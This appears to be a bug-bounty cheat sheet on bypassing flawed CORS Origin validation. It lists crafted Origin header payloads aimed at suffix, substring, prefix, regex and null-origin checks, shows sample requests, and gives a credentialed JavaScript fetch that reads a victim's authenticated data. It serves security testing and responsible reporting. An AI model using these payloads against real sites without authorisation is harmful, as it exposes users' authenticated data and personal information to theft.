# CORS Bypass Techniques

Servers that "validate" `Origin` often use weak substring/prefix/suffix rules instead of exact allowlists. These bypasses defeat common flawed checks and turn an apparent rejection into full ACAO reflection. Combined with `Access-Control-Allow-Credentials: true`, a successful bypass still yields cross-origin reads of a victim's authenticated data (medium severity, high when tokens/PII are returned).

Detection workflow and PoC fetch: [CORS.md](./CORS.md)

## Hunting Checklist

1. Send a plain `Origin: https://attacker.com` and see whether it is reflected, rejected, or replaced with the allowlist default — this tells you the validator's shape.
2. If rejected, try the variants below in order (suffix, prefix, concatenation, `null`, path/query fragments, percent signs).
3. Try changing the HTTP method (GET↔POST) — some CORS filters are method-dependent or cached per verb.
4. Once one variant reflects, enumerate every authenticated endpoint for the same behavior (the validator is usually global middleware).
5. Verify with a real `fetch(..., {credentials:'include'})` from the winning origin, not just a header reflection.

## Test Cases & Examples

Origin-header variants to replay against the same request:

```http
GET /api/v1/me HTTP/1.1
Host: target.com
Origin: null
```

```http
Origin: https://attacker.com
Origin: https://attacker.target.com          # subdomain suffix accepted by flawed match
Origin: https://attackertarget.com           # concatenation defeats substring checks
Origin: https://sub.attackertarget.com
Origin: https://sub.attacker target.com      # space/tab tricks in some parsers
Origin: https://sub.attacker%target.com      # percent sign confuses naive regex
Origin: https://attacker.com/target.com      # origin + path to satisfy endsWith/contains
```

(Also rotate the request method when reflecting is method-dependent: change `GET` to `POST` / `POST` to `GET` with the same `Origin`.)

Reading the response after each attempt:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: <whatever-you-sent>   # reflected ⇒ filter bypassed
Access-Control-Allow-Credentials: true
```

Confirming from the attacker page:

```javascript
fetch('https://target.com/api/v1/me', {credentials: 'include'}).then(r => r.json()).then(console.log);
```

## Bypass Techniques

Canonical list of flawed-check bypasses (each targets a different bad validation pattern):

1. `Origin: null` — trusted by policies allowing `null` origins (sandboxed iframes, `data:` URIs, local files).
2. `Origin: attacker.com` — no validation at all.
3. `Origin: sub.attacker.target.com` / `attacker.target.com` — ends-with / suffix matching.
4. `Origin: attackertarget.com` / `sub.attackertarget.com` — substring matching.
5. `Origin: sub.attacker target.com` — space/tab separators slipping past filters.
6. `Origin: sub.attacker%target.com` — percent sign breaking naive string comparison.
7. `Origin: attacker.com/target.com` — path appended so the value still *contains* the legit domain.
8. **Method switch** — reflect on POST but not GET (or vice-versa); middleware may differ per verb.
9. Prefix matching (`startsWith("https://target.com")`): use `https://target.com.attacker.com`.
10. Unanchored regex: embed the legit domain anywhere, e.g. `https://target.com.evil.io`, `https://evil.io/?x=target.com`, `https://evil.io/#target.com`.
11. Scheme quirks: `http://` vs `https://` if the policy only pins one.

## Tools & Resources

- Scanners with built-in origin fuzzing: [CORScanner](https://github.com/chenjj/CORScanner), [Corsy](https://github.com/s0md3v/Corsy), [theftfuzzer](https://github.com/lc/theftfuzzer), [CorsMe](https://github.com/Shivangx01b/CorsMe)
- Reference tweets (original research behind variants):
  - https://twitter.com/trbughunters/status/1287023673845612546
  - https://twitter.com/Paresh_parmar1/status/1265251507655630848
  - https://twitter.com/Alra3ees/status/1141504347089584128
- Author: **[@tamimhasan404](https://twitter.com/tamimhasan404)**

## Report Tips

- State exactly which validation rule you defeated (suffix/substring/null) — it makes the fix ("exact-match allowlist") trivial for triage.
- Include a replayable `curl -H 'Origin: ...'` plus the response headers, and the browser PoC showing credentials-included cross-origin read.
- If the same bypass works across multiple authenticated endpoints, list them; broad reflection of arbitrary origins is what raises severity from informational to paid.
